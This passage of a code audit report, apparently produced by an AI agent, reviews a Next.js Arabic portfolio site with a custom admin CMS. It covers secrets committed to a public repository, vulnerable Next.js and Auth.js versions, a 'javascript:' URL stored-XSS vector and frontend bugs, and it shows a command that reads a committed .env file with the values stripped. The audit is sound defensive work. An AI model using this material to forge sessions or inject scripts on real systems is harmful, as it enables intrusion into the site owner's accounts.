# Project Audit & Improvement Plan

**Project:** `portfolio-ar` — "Books With Arwa" Arabic (RTL) media-kit / portfolio website with a custom admin CMS
**Audit date:** 2026-10-18
**Audited revision:** `de6ba39` on branch `claude/festive-pascal-fsi8bt` (working tree clean at audit start)
**Audit type:** Static code review plus safe, non-destructive checks. No application code, configuration, dependency, or schema was modified.

> **Secrets notice.** This report does not reproduce any secret value. Where credentials are involved, only the file and variable *names* are given. The `.env` file's values were not printed or inspected during the audit.

---

## 1. Executive Summary

### What the project does

The project is a single-page Arabic portfolio / media kit for a book content creator ("Books With Arwa"). The public page (`/`) shows Hero, About, Services, Previous Works (videos), Pricing, Contact and Footer sections. A password-protected admin area (`/admin/*`) lets the site owner edit all of that content. The content is stored in a Neon Postgres database through Drizzle ORM, and images and videos are uploaded to Cloudinary. Visitors send contact messages from the browser through EmailJS.

### Overall engineering assessment

For a small personal project the architecture is reasonable and fairly modern: Next.js 15 App Router, Server Components for data loading, Server Actions with Zod validation for mutations, and Auth.js v5 Credentials with JWT sessions. Every mutating Server Action checks the session itself, so authorization does not depend only on middleware. That is the most important design decision, and it was made correctly.

Operational security, correctness and production hygiene are where the project falls short:

- **The production `.env` file, with every secret variable in it, is committed to a public GitHub repository.** It is present in 7 commits, starting from the first commit.
- The resolved versions of `next` and `next-auth` have **critical published advisories**, including an unauthenticated RCE in the Next.js Image Optimization API (which this site uses) and an Auth.js "fail-open" auth check issue.
- Several functional bugs are confirmed from the code. The public site renders every ordered list **in reverse** of the admin order. The About-stats "visible" toggle **cannot hide anything**. Video uploads above 10 MB **always fail**, even though the UI advertises 50 MB.
- There are **no tests, no linter installation, no CI, no env validation**, and the README/SETUP docs describe a different stack (Sanity CMS, Next 16, React 19).

### Strongest aspects

1. Defence-in-depth authorization: every mutating Server Action calls `auth()` before doing anything (`lib/actions/*.ts`).
2. Server-side Zod validation on every Server Action input, and parameterized queries through Drizzle (no raw SQL built from user input).
3. Passwords are hashed with bcrypt. The login error message is generic, so it does not reveal whether an account exists.
4. The DB enforces business rules where it matters: a partial unique index for "only one popular package", singleton indexes, and an FK with `ON DELETE CASCADE` (applied via script, see DB-001).
5. RTL/Arabic support is done properly (`<html lang="ar" dir="rtl">`, Arabic `next/font` subsets, shadcn RTL config).
6. The home page loads its data in parallel (`Promise.all`) and falls back gracefully to static content if the DB is unavailable.

### Most important weaknesses

1. Secrets exposed in a public repository (SEC-001).
2. Known-vulnerable framework and auth library versions (SEC-002).
3. No brute-force protection on the only login (SEC-003).
4. Confirmed data-display bugs: reversed ordering (BE-001) and a broken visibility toggle (FE-001).
5. Upload size limits that contradict each other (BE-002).
6. No quality gates at all: tests, lint and CI are missing (DEVOPS-001).

### Top five recommended actions

| # | Action | Findings |
|---|--------|----------|
| 1 | **Rotate every credential in `.env`**: Neon DB password/URL, `AUTH_SECRET`, admin password, Cloudinary API secret, and any Stripe keys from older commits. Then untrack `.env`, add it to `.gitignore`, and purge it from git history. | SEC-001 |
| 2 | Upgrade `next` to ≥ 15.5.27 (latest 15.5.x) and `next-auth` to a release after `5.0.0-beta.31` (or the stable v5 line). Re-run `npm audit`. | SEC-002 |
| 3 | Add login rate limiting / lockout. | SEC-003 |
| 4 | Fix the confirmed functional bugs: ordering direction, the stats visibility toggle, and upload limits (move uploads to direct signed Cloudinary uploads). | BE-001, FE-001, BE-002 |
| 5 | Add a minimal quality pipeline: ESLint + `tsc --noEmit` + `next build` in GitHub Actions, plus a few tests around Server Actions. | DEVOPS-001 |

### Production-readiness assessment

**Not production-ready in its current state.** The site appears to be deployed and working for its owner, but the credential leak (SEC-001) means anyone who has viewed the public repository may already be able to read or modify the database directly, sign valid admin session tokens with the leaked `AUTH_SECRET`, or use the Cloudinary account. Until the credentials are rotated and the framework upgraded, the integrity of the site's content cannot be assumed. Once the P0 and P1 items in §13 are done, the codebase is a sound base for a small, low-traffic personal site.

---

## 2. Project Architecture Overview

### Technology stack (resolved versions from `package-lock.json`)

| Area | Technology | Version |
|------|-----------|---------|
| Framework | Next.js (App Router) | 15.5.23 (`^15.5.23`) |
| UI runtime | React / React DOM | 18.3.1 |
| Language | TypeScript (`strict: true`) | 5.7.3 |
| Package manager | npm (lockfile v3) | — |
| Styling | Tailwind CSS **v3** (`tailwindcss` 3.4.19) via `postcss.config.mjs`; `@tailwindcss/postcss` **v4** also installed but unused; shadcn/ui ("radix-nova" style, RTL) using the `radix-ui` meta package | — |
| Animation | GSAP 3.14 + `@gsap/react` (`useGSAP`), ScrollTrigger | — |
| Auth | Auth.js / `next-auth` 5.0.0-beta.30 (`@auth/core` 0.41.0), Credentials provider, JWT sessions | — |
| Database | Neon serverless Postgres, `@neondatabase/serverless` 1.0.2 (HTTP driver) | — |
| ORM / migrations | Drizzle ORM 0.45.1, drizzle-kit 0.31.9 | — |
| Media | Cloudinary Node SDK 2.10.1 (server-side signed uploads) | — |
| Email | `@emailjs/browser` 4.4.1 (client-side) | — |
| Validation | Zod 3.25 | — |
| Notifications | sonner | — |
| Unused but installed | `stripe`, `date-fns`, `@hookform/resolvers`, 25 individual `@radix-ui/react-*` packages, `next-themes` (only in an unused provider), `recharts`/`embla`/`vaul`/`cmdk`/etc. (only referenced by unused shadcn components) | — |

### Rendering and routing model

- **App Router only** (no `pages/`).
- **Route Handler:** a single one, `app/api/auth/[...nextauth]/route.ts` (Auth.js handlers, `runtime = "nodejs"`).
- **Server Actions:** 9 files under `lib/actions/` with 43 exported actions (CRUD for every content type, password change, media upload).
- **Middleware:** `middleware.ts` (Next 15 convention; the Next 16 `proxy.ts` rename does not apply) protects `/admin/:path*` except `/admin/login`.
- **Public page** `app/page.tsx`: a Server Component, `export const dynamic = "force-dynamic"`. It fetches all content and passes plain props to section components, which are all `"use client"` because they use GSAP (except `Footer`).
- **Admin pages** `app/admin/*/page.tsx`: Server Components that call the `get*` Server Actions to read data, then render `"use client"` manager/form components. `app/admin/layout.tsx` is itself a Client Component.
- **Login** lives in a separate route group: `app/(auth)/admin/login/page.tsx`. It is a client page that uses `signIn("credentials", { redirect: false })`.

### Project structure (relevant parts)

```
app/
  layout.tsx               root layout: fonts, static metadata, SessionProvider, Toaster
  page.tsx                 public single page (force-dynamic)
  (auth)/admin/login/      login page (client)
  admin/                   admin layout (client) + 9 pages (server) + password page (client)
  api/auth/[...nextauth]/  Auth.js route handler
auth.ts                    Auth.js config (Credentials → admins table, bcrypt)
middleware.ts              /admin guard (+ commented-out rate limiter)
components/
  header|hero|about|services|portfolio|pricing|contact|footer.tsx   public sections
  admin/{about,contact,hero,pricing,services,settings,social,works}/  managers/forms
  admin/layout/{navbar,sidebar}.tsx, admin/shared/*                   admin chrome
  ui/*                     ~55 shadcn components (≈40 unused)
lib/
  actions/*.actions.ts     Server Actions (auth check + zod + drizzle + revalidatePath)
  data-server.ts           public read functions (no auth, visibility filter)
  data.ts                  hardcoded fallback content
  db.ts / schema.ts        Neon HTTP + Drizzle schema (12 tables)
  gsap.ts, cloudinary.ts (unused), utils.ts
drizzle/                   SQL migrations (only 0000/0001 in journal) + snapshots
scripts/seed.ts, apply-constraints.ts, seed-wrapper.js
```

### Data flow

```mermaid
flowchart LR
  subgraph Browser
    V[Visitor] -->|GET /| PUB[Public sections<br/>client components + GSAP]
    PUB -->|sendForm| EJS[(EmailJS API)]
    PUB -->|useSession: GET /api/auth/session| AUTHAPI
    A[Admin] --> LOGIN[/admin/login<br/>signIn credentials/]
    A --> ADMINUI[Admin managers<br/>client components]
  end

  subgraph "Next.js server (Vercel, assumed)"
    MW[middleware.ts<br/>auth() guard for /admin/*]
    PAGE[app/page.tsx<br/>force-dynamic RSC]
    DS[lib/data-server.ts<br/>public reads]
    APAGES[app/admin/*/page.tsx RSC]
    SA[lib/actions/*<br/>Server Actions:<br/>auth() + zod + drizzle]
    AUTHAPI[/api/auth/... Auth.js/]
    AUTHCFG[auth.ts<br/>Credentials + bcrypt + JWT]
  end

  NEON[(Neon Postgres)]
  CLD[(Cloudinary)]

  PAGE --> DS --> NEON
  LOGIN --> AUTHAPI --> AUTHCFG --> NEON
  ADMINUI -. requests .-> MW
  MW --> APAGES --> SA
  ADMINUI -->|POST server action| SA
  SA --> NEON
  SA -->|upload_stream| CLD
  SA -->|revalidatePath '/'| PAGE
```

### Authentication and authorization flow

1. The admin submits email and password on `/admin/login`. `next-auth/react` `signIn("credentials")` posts to `/api/auth/callback/credentials` (Auth.js handles its own CSRF token).
2. `auth.ts` `authorize()` looks the admin up by exact email, compares the password with `bcrypt.compare`, and returns `{id, name, email, role: "admin"}`.
3. Auth.js issues an encrypted JWT session cookie, signed and encrypted with `AUTH_SECRET`. The default `maxAge` is 30 days. There is no DB session.
4. `middleware.ts` redirects unauthenticated `/admin/*` requests to `/admin/login`.
5. Every Server Action independently re-checks `session?.user?.id`. There is only one role (`admin`), and no per-resource ownership, so IDOR is not applicable.

### External services

| Service | Where used | Credentials |
|---------|-----------|-------------|
| Neon Postgres | `lib/db.ts`, `drizzle.config.ts`, scripts | `DATABASE_URL` (server) |
| Cloudinary | `lib/actions/media.actions.ts` | `CLOUDINARY_CLOUD_NAME`, `CLOUDINARY_API_KEY`, `CLOUDINARY_API_SECRET` (server) |
| EmailJS | `components/contact.tsx` (browser) | `NEXT_PUBLIC_EMAILJS_*` (public by design) |
| Auth.js | `auth.ts` | `AUTH_SECRET`, `AUTH_URL` |
| Seed | `scripts/seed.ts` | `ADMIN_EMAIL`, `ADMIN_PASSWORD` |
| Stripe | **Not used in code.** Keys existed in historical `.env` revisions | `STRIPE_SECRET_KEY`, `NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY` (history only) |
| Sanity | **Not used.** Remnants in `next.config.mjs` image patterns, README, and the first commit's `.env` | — |

---

## 3. Audit Scope and Methodology

### Areas inspected (source read in full)

- **Config:** `package.json`, `package-lock.json` (versions via script), `next.config.mjs`, `tsconfig.json`, `tailwind.config.ts`, `postcss.config.mjs`, `components.json`, `drizzle.config.ts`, `.gitignore`, `.vscode/settings.json`, `next-env.d.ts`
- **Auth:** `auth.ts`, `middleware.ts`, `types/next-auth.d.ts`, `app/api/auth/[...nextauth]/route.ts`, `app/(auth)/admin/login/page.tsx`, `lib/actions/auth.actions.ts`, `app/admin/settings/password/page.tsx`
- **Data layer:** `lib/db.ts`, `lib/schema.ts`, `lib/data-server.ts`, `lib/data.ts` (partially, the fallback content), all `drizzle/*.sql`, `drizzle/meta/_journal.json`
- **Server Actions:** all 9 files in `lib/actions/`
- **Admin:** `app/admin/layout.tsx`, `app/admin/page.tsx`, all `app/admin/*/page.tsx`, all `components/admin/**`
- **Public:** `app/layout.tsx`, `app/page.tsx`, `app/globals.css`, `components/{header,hero,about,services,portfolio,pricing,contact,footer,theme-provider}.tsx`, `lib/gsap.ts`, `lib/utils.ts`
- **Scripts:** `scripts/seed.ts` (structure, admin creation, ordering values), `scripts/apply-constraints.ts`, `scripts/seed-wrapper.js`
- **UI library:** `components/ui/switch.tsx` and `button.tsx` (to verify specific behaviour); import-usage scan across all `components/ui/*`
- **Docs:** `README.md`, `SETUP_GUIDE.md`
- **Git metadata:** tracked-file list, `.env` commit history (variable names only), repository visibility (via GitHub API: **public**)

### Areas not fully inspected

- The individual shadcn components in `components/ui/*` were not reviewed line by line. They are generated library code, and most are unused.
- `styles/globals.css` was compared against `app/globals.css` and found to be an unused duplicate. It was not reviewed further.
- `drizzle/meta/*_snapshot.json` were not reviewed.
- Static assets in `public/` were only checked for size.
- The live deployment, Neon project settings, Cloudinary account settings and EmailJS dashboard settings (domain allowlists, rate limits) were **not** inspected, since there is no access and it would not be appropriate.

### Commands executed

| Command | Purpose | Result |
|---------|---------|--------|
| `git status`, `git log`, `git ls-files` | Repo state; tracked files | Clean tree; `.env`, `tsconfig.tsbuildinfo`, `.vscode/settings.json` are tracked |
| `git log --all -- .env` + `git show <c>:.env \| sed 's/=.*//'` | Which commits contain `.env`, and the **variable names only** | 7 commits (see SEC-001) |
| GitHub repository search (MCP) | Repo visibility | `private: false` |
| `node -e …package-lock.json…` | Resolved versions | See §2 |
| `npm audit --package-lock-only --json` | Known-vulnerability scan from the lockfile only (no install, lockfile not modified) | 39 advisories: 4 critical, 24 high, 9 moderate, 2 low (see §11) |
| grep-based import scans | Unused dependencies, components, exports | See FE-008, DEVOPS-002 |
| Node WCAG contrast computation on CSS tokens | Accessibility | See A11Y-001 |

One attempt to check whether `.env` values were empty or non-empty (without printing them) was blocked by the environment's safety policy. Value contents were therefore never examined.

### Checks that could not be run

`node_modules/` is not present in the checkout, and the audit brief forbids installing packages. So **`tsc --noEmit`, `npm run lint`, `next build`, and tests were not run.** Separately:
- `npm run lint` would fail regardless, because `eslint` is not a dependency and there is no ESLint config (see DEVOPS-001).
- There are no tests to run.
- `next build` would also need a database URL at import time (`lib/db.ts` throws when it is missing).

### Confidence and evidence standards

- **Confirmed:** directly demonstrated by reading the code or by tool output.
- **Strongly Suspected:** the code path is clear, but the outcome depends on runtime or platform behaviour that was not executed.
- **Needs Verification:** plausible, but requires a browser, the deployment, or external dashboards to confirm.

---

## 4. Findings Summary

| ID | Title | Category | Severity | Confidence | Effort |
|----|-------|----------|----------|------------|--------|
| SEC-001 | Production `.env` with all secrets committed to a public repository | Security | **Critical** | Confirmed | M |
| SEC-002 | `next` and `next-auth` versions with critical published advisories | Security | **Critical** | Confirmed | S |
| SEC-003 | No brute-force protection on admin login | Security | High | Confirmed | S |
| BE-001 | Public site renders all ordered content in reverse | Backend | High | Confirmed | XS |
| FE-001 | About-stats "visible" toggle can never hide a stat | Frontend | High | Confirmed | XS |
| BE-002 | Upload limits are inconsistent; videos > 10 MB always fail | Backend | High | Confirmed | M |
| DEVOPS-001 | No ESLint installation, no tests, no CI | DevOps / Testing | High | Confirmed | M |
| SEC-004 | URL fields accept `javascript:` and other unsafe schemes (stored XSS vector) | Security | Medium | Confirmed | S |
| SEC-005 | Missing security headers (CSP, Referrer-Policy, Permissions-Policy, HSTS) | Security | Medium | Confirmed | S |
| SEC-006 | Sessions not invalidated on password change; 30-day JWT lifetime | Security | Medium | Confirmed | S |
| BE-003 | Multi-step writes without transactions; find-then-insert singleton race | Backend / Data | Medium | Strongly Suspected | S |
| BE-004 | Server Actions don't handle DB errors or validate IDs; client gives no feedback | Backend | Medium | Confirmed | S |
| BE-005 | Public data layer silently swallows DB errors; sequential About queries | Backend | Medium | Confirmed | XS |
| FE-002 | Admin uses `window.location.reload()` and divergent local state; interval leak | Frontend | Medium | Confirmed | S |
| FE-003 | Contact form has no failure UI; WhatsApp number hardcoded | Frontend | Medium | Confirmed | S |
| FE-004 | Several CMS fields are not wired to the public site; hardcoded content | Frontend | Medium | Confirmed | S |
| FE-005 | `next/image` with admin-supplied hosts can crash the homepage; no error boundaries | Frontend | Medium | Strongly Suspected | S |
| PERF-001 | Homepage is `force-dynamic`: ~10 DB queries per visit | Performance | Medium | Confirmed | S |
| PERF-002 | Portfolio autoplays multiple MP4s eagerly (no poster, lazy loading or preload control) | Performance | Medium | Confirmed | S |
| SEO-001 | Static metadata ignores DB settings; no `metadataBase`, canonical, or OG image | SEO | Medium | Confirmed | S |
| SEO-002 | No `sitemap`/`robots`; admin pages not marked `noindex` | SEO | Medium | Confirmed | XS |
| A11Y-001 | Colour-contrast failures (accent text 1.75:1, primary buttons 3.3:1) | Accessibility | Medium | Confirmed | S |
| A11Y-002 | Nested interactive elements (`<a><button>`) on CTAs | Accessibility | Medium | Confirmed | XS |
| A11Y-003 | Missing labels / accessible names (contact form, icon buttons, admin labels) | Accessibility | Medium | Confirmed | S |
| A11Y-004 | Media upload control is not keyboard-operable | Accessibility | Medium | Confirmed | XS |
| A11Y-005 | No reduced-motion support; videos lack accessible names | Accessibility | Medium | Confirmed | S |
| DB-001 | Migration history inconsistent with the real DB; `push` may drop constraints | Database | Medium | Strongly Suspected | S |
| DEVOPS-002 | Dependency hygiene: CLIs in runtime deps, unused packages, mixed Tailwind v3/v4 | DevOps | Medium | Confirmed | S |
| DEVOPS-003 | Stale docs, no `.env.example`, no env validation | DevOps | Medium | Confirmed | S |
| SEC-007 | Contact form abuse (client-side EmailJS, no CAPTCHA/honeypot) | Security | Low | Needs Verification | S |
| SEC-008 | Weak defaults: seed fallback `admin123`, 8-char policy, case-sensitive email | Security | Low | Confirmed | XS |
| BE-006 | Video upload retries on any error; whole file buffered in memory | Backend | Low | Confirmed | XS |
| BE-007 | Cloudinary assets are never deleted (orphans); duplicate Cloudinary config | Backend | Low | Confirmed | S |
| BE-008 | Dashboard counts load whole tables sequentially | Backend | Low | Confirmed | XS |
| ARCH-001 | Duplicated read paths and auth boilerplate; middleware double `auth()` | Architecture | Low | Confirmed | S |
| FE-006 | Pervasive `any`, untyped props, `as any` variant casts | Frontend | Low | Confirmed | M |
| FE-007 | Admin navbar placeholder UI (no-op search, fake "3" badge, desynced icon) | Frontend | Low | Confirmed | XS |
| FE-008 | Dead code and duplicate files | Frontend | Low | Confirmed | S |
| FE-009 | Pricing "popular" badge positioning and currency typo | Frontend | Low | Needs Verification | XS |
| FE-010 | Dark-mode tokens defined but unreachable | Frontend | Informational | Confirmed | — |
| FE-011 | Portfolio section has no anchor/nav entry; card link falls back to `#` | Frontend | Low | Confirmed | XS |
| PERF-003 | Root `SessionProvider` makes every visitor fetch `/api/auth/session` | Performance | Low | Confirmed | XS |
| PERF-004 | `priority` on all icons; two Arabic font families loaded | Performance | Low | Confirmed | XS |
| SEO-003 | No structured data | SEO | Informational | Confirmed | XS |
| A11Y-006 | LTR fields rendered RTL; mixed-language validation messages | Accessibility | Low | Confirmed | XS |
| DB-002 | Unused enum, timestamps without TZ, unbounded text | Database | Low | Confirmed | S |
| DEVOPS-004 | Build artefacts and editor files tracked; minimal `.gitignore` | DevOps | Low | Confirmed | XS |

Effort scale: XS < 1 h · S ≈ 1–4 h · M ≈ 0.5–2 days · L ≈ 3–5 days · XL > 1 week.

---

## 5. Frontend Audit

### FE-001 — About-stats "visible" toggle can never hide a stat
- **Category:** Frontend · **Severity:** High · **Confidence:** Confirmed
- **Location:** `components/admin/about/about-manager.tsx:99-100,115`; `lib/actions/about.actions.ts:128,145`; `components/ui/switch.tsx:16-24`
- **Evidence:** The handler reads `(e.currentTarget.querySelector('#isVisible') as HTMLInputElement)?.checked`. The `Switch` component is a Radix `Switch.Root`, which renders a `<button role="switch" id="isVisible">`. The `id` is spread onto the button, and buttons have no `.checked` property, so the value is always `undefined`. `fd.set("isVisible", "undefined")` follows. On the server, `"undefined"` matches neither `"true"`, `"on"` nor `"false"`, so the action falls through to `true`.
- **Impact:** The admin cannot hide any About stat. The UI toggle appears to work but is silently ignored. Hiding stats is also the only way the public `getAboutContent` filter (`isVisible = true`) ever has an effect.
- **Recommendation:** Make the Switch controlled, as the other managers already do (`checked` + `onCheckedChange` → state → `fd.set("isVisible", String(state))`). Alternatively, give it a `name` and `value` so Radix's hidden bubble input is submitted.
- **Implementation guidance:** Follow the `isVisible` state pattern in `services-manager.tsx:42,129-134`. Reset the state when the dialog opens for "add" and when editing an item.
- **Effort:** XS (≈30 min) · **Dependencies:** none
- **Verification:** Edit a stat, toggle it off, save. The DB `about_stats.is_visible` should be `false`, the admin list should show 🚫, and the stat should disappear from `/`. Add a unit test for the form-data mapping if FE logic is extracted (see §15).

### FE-002 — Admin uses `window.location.reload()` and divergent local state; progress-interval leak
- **Category:** Frontend · **Severity:** Medium · **Confidence:** Confirmed
- **Location:** `components/admin/social/social-manager.tsx:30`, `works/works-manager.tsx:29`, `pricing/pricing-manager.tsx:29,56,80,103`, `services/services-manager.tsx:55`, `about/about-manager.tsx:57,102`; `components/admin/shared/media-upload.tsx:48-55`
- **Evidence:**
  - After every create or update, the managers do a full `window.location.reload()`, but deletes mutate a local `useState` copy of the server props. The two models diverge: after deleting a pricing package, its features manager still reads `pkg.features` from stale props. A delete followed by a failed reload leaves state inconsistent with the DB.
  - In `MediaUpload`, `clearInterval(progressInterval)` only runs on the success path. If the upload throws, the 200 ms interval keeps calling `setUploadProgress` indefinitely while the component is mounted. The "progress" is also simulated rather than real.
- **Impact:** Full page reloads (slow, scroll position lost, toast often lost before the reload), stale UI, and a timer leak.
- **Recommendation:** Rely on `revalidatePath` (already called) plus `router.refresh()` from `next/navigation`, and drop the duplicated local state, or use `useOptimistic` for deletes. Move `clearInterval` into `finally`.
- **Implementation guidance:** In each manager: `const router = useRouter(); … if (!res.error) { setOpen(false); router.refresh(); }`. Remove `useState(initialX)` and render props directly. For uploads, switch to direct-to-Cloudinary uploads with real progress (see BE-002).
- **Effort:** S (≈2–3 h) · **Dependencies:** none (pairs well with BE-004)
- **Verification:** Create, edit and delete in each manager. The list should update without a full reload, and no `setInterval` should keep running after a forced upload error (check the React DevTools profiler).

### FE-003 — Contact form has no failure UI; WhatsApp number hardcoded
- **Category:** Frontend · **Severity:** Medium · **Confidence:** Confirmed
- **Location:** `components/contact.tsx:15-16,30-55,109,160-164`
- **Evidence:**
  - The EmailJS error branch only does `console.log(error.text)` and stops loading. The visitor gets no message, so a failed send looks like nothing happened.
  - `success` is never reset, so after one success the message stays even if the next attempt fails.
  - The env vars are used with non-null assertions (`!`), so if they are missing, `sendForm` fails at runtime with no message to the user.
  - The WhatsApp button **label** is the hardcoded literal `01150153088` (line 109), while the `href` uses the DB value. If the admin changes the number, the button shows the old one.
  - The fallback email and phone are hardcoded in both `contact.tsx:15-16` and `footer.tsx:9-10`.
- **Impact:** Lost leads, and the business contact number can become wrong.
- **Recommendation:** Add an explicit `status` state (`idle | sending | success | error`) with a visible, `aria-live` error message and a mailto/WhatsApp alternative. Derive the display number from `whatsapp` (as `footer.tsx:64` already does). Move the fallbacks into `lib/data.ts`.
- **Effort:** S (≈1–2 h) · **Dependencies:** SEC-007 (if EmailJS is moved server-side, rewrite this flow at the same time)
- **Verification:** Block `api.emailjs.com` in DevTools and submit. An error message should be shown. Change the WhatsApp number in the admin. Both the label and the link should update.

### FE-004 — Several CMS fields are not wired to the public site; hardcoded content
- **Category:** Frontend · **Severity:** Medium · **Confidence:** Confirmed
- **Location:** `app/layout.tsx:24-35`; `components/about.tsx:15,63-73,82`; `app/page.tsx:78,90,102-103`; `app/admin/page.tsx:97`; `components/admin/layout/navbar.tsx:87,119,127`
- **Evidence:**
  - `site_settings.metaTitle`, `metaDescription` (except in the footer), `ogLocale`, `faviconUrl` and `logoUrl` can be edited in `/admin/settings` but are never read by the public page. The metadata is static in `layout.tsx`.
  - The About "الإحصائيات" card always renders `fallback.highlights` from `lib/data.ts`, never DB data.
  - About stats use a hardcoded layout hack: `item.title === "بينتيرست" ? "col-span-2"`.
  - Section titles and the pricing note are hardcoded in `page.tsx`.
  - The admin greeting and navbar hardcode the name "لولو" instead of using `session.user.name`.
- **Impact:** The admin edits fields that have no visible effect, which is confusing and erodes trust in the CMS. Renaming a stat breaks the layout.
- **Recommendation:** Either wire these fields up (see SEO-001 for metadata) or remove them from the admin form and schema. Use a data-driven layout rule, for example making the last item span two columns when the count is odd. Use `session.user.name`.
- **Effort:** S (≈2–4 h) · **Dependencies:** SEO-001
- **Verification:** Change each admin setting and confirm a visible change on `/` (and in `<head>` for metadata).

### FE-005 — `next/image` with admin-supplied hosts can crash the homepage; no error boundaries
- **Category:** Frontend / Reliability · **Severity:** Medium · **Confidence:** Strongly Suspected
- **Location:** `components/hero.tsx:73-80,90-96`, `contact.tsx:182-189`, `footer.tsx:79-86`, `admin/social/social-manager.tsx:43,57`; `next.config.mjs:6-25`; `lib/actions/social.actions.ts:13`, `hero.actions.ts:11`; absence of `app/error.tsx`, `app/global-error.tsx`, `app/not-found.tsx`, `app/admin/error.tsx`
- **Evidence:**
  - `iconUrl` is validated only as `z.string().min(1)`, and `profileImageUrl` likewise. The admin UI explicitly invites pasting arbitrary URLs ("/tiktok.svg أو رابط Cloudinary").
  - `next/image` throws at render time for a remote host that isn't in `images.remotePatterns`. Currently that means only Cloudinary, plus leftover Sanity entries.
  - There is no error boundary anywhere, so one bad icon URL turns `/` into the default Next.js error page.
- **Impact:** A single admin typo (e.g. an Instagram CDN icon URL) takes the whole public site down.
- **Recommendation:**
  1. Validate image URLs server-side: either relative `/…` paths or `https://res.cloudinary.com/<your-cloud>/…`.
  2. Add `app/error.tsx` (with a friendly RTL message and retry) and `app/admin/error.tsx`.
  3. Remove the Sanity patterns and pin Cloudinary to your cloud's path.
- **Effort:** S (≈2 h) · **Dependencies:** SEC-004 (same validation helper)
- **Verification:** In a dev environment, attempt to save `https://example.com/x.png` as an icon. It should be rejected. Force a render error and confirm the error boundary renders.

### FE-006 — Pervasive `any`, untyped props, `as any` casts
- **Category:** Frontend / TypeScript · **Severity:** Low · **Confidence:** Confirmed
- **Location:** `app/page.tsx:45,50,55,67,69,79,91,104,109,121`; all `components/admin/*/…-manager.tsx` (`initialX: any[]`, `useState<any>`, `(s:any)=>`); `about-manager.tsx:16` (`props: any`); `media-upload.tsx:53,63`; `hero.tsx:11` (`variant: any`)
- **Evidence:** Drizzle already exports precise types (`lib/schema.ts:160-184`), but the UI layer discards them. The CTA `variant` is free text in the DB and admin form, then cast `as any` into the `Button` variant prop, so an invalid value silently renders the default style.
- **Impact:** Refactors like BE-001 or schema changes won't be caught by the compiler. This is the main reason a broken prop shape compiles.
- **Recommendation:** Type the props with the schema types (`Service[]`, `PricingPackageWithFeatures[]`, …). Constrain `ctaButtonVariant*` with `z.enum([...buttonVariants])` and render a `<Select>` in the admin.
- **Effort:** M (≈0.5–1 day) · **Dependencies:** DEVOPS-001 (lint rule `no-explicit-any` as a guard)
- **Verification:** `tsc --noEmit` passes with `@typescript-eslint/no-explicit-any` set to `warn` or `error`.

### FE-007 — Admin navbar placeholder UI
- **Category:** Frontend / UX · **Severity:** Low · **Confidence:** Confirmed
- **Location:** `components/admin/layout/navbar.tsx:26,62-76,97-105,157-176,193-207`; `app/admin/layout.tsx:8-16`
- **Evidence:**
  - The search box opens but does nothing.
  - The mobile bell shows a hardcoded "3" badge with no notifications feature behind it.
  - The navbar keeps its own `isMobileMenuOpen`, separate from the layout's `isSidebarOpen`. Closing the sidebar via the overlay or a link leaves the navbar showing the "X" icon.
  - The profile dropdown has no keyboard or escape handling (a hand-rolled menu instead of the installed shadcn `DropdownMenu`).
- **Impact:** A misleading UI, and the menu toggle icon gets out of sync.
- **Recommendation:** Remove the search and bell (or implement them). Drive the icon from the layout's `isSidebarOpen` prop. Use `DropdownMenu` for the profile.
- **Effort:** XS (≈1 h) · **Dependencies:** none
- **Verification:** On mobile, open the menu and close it via the overlay. The icon should revert.

### FE-008 — Dead code and duplicate files
- **Category:** Frontend / Maintainability · **Severity:** Low · **Confidence:** Confirmed
- **Location / Evidence:**
  - Unused components and modules: `components/admin/shared/form-dialog.tsx`, `components/admin/shared/loading-skeleton.tsx`, `components/theme-provider.tsx`, `lib/cloudinary.ts` (`media.actions.ts:7-12` duplicates its config), `adminLinks` in `lib/data.ts:13-18`, `animateOnScroll` in `lib/gsap.ts:6-20`.
  - Unused Server Actions: `deleteMedia`, `toggleServiceVisibility`, `getPricingFeatures`.
  - Duplicates: `hooks/use-mobile.ts` vs `hooks/use-mobile.tsx` (identical logic), `hooks/use-toast.ts` vs `components/ui/use-toast.ts` (identical), `styles/globals.css` (unused, Tailwind v3/v2 starter), a second `@layer base` block in `app/globals.css:103-113` that duplicates lines 92-100.
  - ~40 of ~55 `components/ui/*` files are not imported by app code (accordion, calendar, carousel, chart, command, drawer, form, sidebar, table, …).
  - `lib/gsap.ts:46-55` animates `.hero-button`, but no element has that class, so the timeline step is a no-op.
  - `next.config.mjs:9-16` still allows Sanity image hosts.
  - `lib/schema.ts:13` defines an unused `popular_package` enum, which also exists in the DB (`0001_daffy_ravenous.sql:1`).
- **Impact:** Noise, slower onboarding, and a larger install. Unused UI files don't affect the client bundle (they are tree-shaken), but they pull in dependencies (DEVOPS-002).
- **Recommendation:** Delete the dead code in one dedicated PR after tests and lint exist. Either add the `hero-button` class to the CTA wrappers or remove the step.
- **Effort:** S (≈2 h) · **Dependencies:** DEVOPS-001
- **Verification:** `tsc`, lint and build pass; a knip/ts-prune style scan reports nothing (optional tool, run via `npx` in CI only).

### FE-009 — Pricing "popular" badge positioning and currency typo
- **Category:** Frontend / UI · **Severity:** Low · **Confidence:** Needs Verification
- **Location:** `components/pricing.tsx:36-48,63`
- **Evidence:** The badge uses `absolute top-5 left-5`, but the card has no `relative` class. Its containing block is whichever ancestor has a transform: `md:scale-105` on desktop, or GSAP's leftover inline `transform` after the reveal animation. On mobile before or without the animation, the badge may be positioned against the section or the page. The currency reads "جنية" here but "جنيه" in the admin (`pricing-manager.tsx:42`).
- **Impact:** A potentially mispositioned badge on small screens, and a visible spelling inconsistency.
- **Recommendation:** Add `relative` to the card. Use "جنيه" consistently, ideally via a shared constant or `Intl.NumberFormat("ar-EG", { style: "currency", currency: "EGP" })`.
- **Effort:** XS · **Verification:** View `/#pricing` at 375 px width with `prefers-reduced-motion` emulated; the badge should sit inside the highlighted card.

### FE-010 — Dark-mode tokens defined but unreachable (Informational)
- **Location:** `app/globals.css:54-88`; `tailwind.config.ts:4`; `components/theme-provider.tsx`
- **Evidence:** `.dark` tokens and `darkMode: ["class"]` exist, but no `ThemeProvider` is mounted and no toggle exists, so dark mode can never activate.
- **Recommendation:** Either mount `next-themes` with a toggle and check contrast in both themes, or delete the `.dark` block, the provider and the dependency. This is a product decision, not a bug.

### FE-011 — Portfolio section has no anchor or nav entry; card link falls back to `#`
- **Category:** Frontend / UX · **Severity:** Low · **Confidence:** Confirmed
- **Location:** `components/portfolio.tsx:22,36`; `lib/data.ts:6-12`
